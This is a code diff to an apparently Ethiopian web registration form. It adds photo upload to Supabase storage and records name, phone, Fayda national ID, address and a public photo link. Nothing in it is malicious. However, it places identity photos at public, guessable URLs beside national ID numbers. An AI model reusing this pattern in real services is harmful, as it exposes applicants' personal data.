@@ -15,7 +15,6 @@
         body { font-family: 'Segoe UI', 'Ubuntu', sans-serif; background: #f0f2f5; margin: 0; padding: 10px; color: #333; }
         .container { background: #fff; max-width: 850px; margin: 20px auto; padding: 40px; border-radius: 30px; box-shadow: 0 20px 60px rgba(0,0,0,0.15); border-top: 15px solid var(--saf-green); }
         
-        /* የሚያምር ርዕስ */
         .brand-header { text-align: center; margin-bottom: 30px; }
         .brand-name { font-size: 45px; font-weight: 900; background: var(--gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; letter-spacing: 2px; }
         
@@ -142,29 +141,60 @@
     }
 
     async function submitData() {
+        // "መረጃውን ላክ" ሲጫን የሚመጣ የሎዲንግ መልዕክት
+        document.getElementById("nextBtn").innerText = "በመላክ ላይ... / Sending...";
+        document.getElementById("nextBtn").disabled = true;
+
         const name = document.getElementById("full_name").value;
-        const allData = {
-            full_name: name,
-            gender: document.getElementById("gender").value,
-            age: document.getElementById("age").value,
-            phone: document.getElementById("phone").value,
-            fayda: document.getElementById("fayda_id").value,
-            region: document.getElementById("region").value,
-            edu: document.getElementById("edu").value,
-            submitted_at: new Date().toISOString()
-        };
+        const phone = document.getElementById("phone").value;
+        const pPhotoFile = document.getElementById("p_photo").files[0];
 
-        const { error } = await _supabase.from('registrations').insert([{ 
-            full_name: name, 
-            phone: allData.phone, 
-            all_data: allData 
-        }]);
+        try {
+            // 1. ፎቶውን ወደ Storage 'uploads' ባኬት መላክ
+            const fileName = `${Date.now()}_${name.replace(/\s/g, '_')}.jpg`;
+            const { data: uploadData, error: uploadError } = await _supabase.storage
+                .from('uploads')
+                .upload(fileName, pPhotoFile);
 
-        if(!error) {
+            if (uploadError) throw uploadError;
+
+            // 2. የፎቶውን የሕዝብ ሊንክ ማግኘት
+            const { data: urlData } = _supabase.storage.from('uploads').getPublicUrl(fileName);
+            const photoUrl = urlData.publicUrl;
+
+            // 3. ሙሉ መረጃውን ማዘጋጀት
+            const allData = {
+                full_name: name,
+                gender: document.getElementById("gender").value,
+                age: document.getElementById("age").value,
+                phone: phone,
+                fayda: document.getElementById("fayda_id").value,
+                region: document.getElementById("region").value,
+                address: document.getElementById("address_detail").value,
+                education: document.getElementById("edu").value,
+                photo_link: photoUrl, // ምስሉን እዚህ ጋር አያያዝነው
+                submitted_at: new Date().toISOString()
+            };
+
+            // 4. ወደ Table መላክ
+            const { error: tableError } = await _supabase.from('registrations').insert([{ 
+                full_name: name, 
+                phone: phone, 
+                all_data: allData 
+            }]);
+
+            if (tableError) throw tableError;
+
+            // ስኬት
             document.getElementById("regForm").style.display="none";
             document.getElementById("success").style.display="block";
             document.getElementById("finalName").innerText = name;
-        } else { alert("Error sending data: " + error.message); }
+
+        } catch (err) {
+            alert("ስህተት ተፈጥሯል: " + err.message);
+            document.getElementById("nextBtn").innerText = "መረጃውን ላክ / Submit";
+            document.getElementById("nextBtn").disabled = false;
+        }
     }
 </script>
 </body>
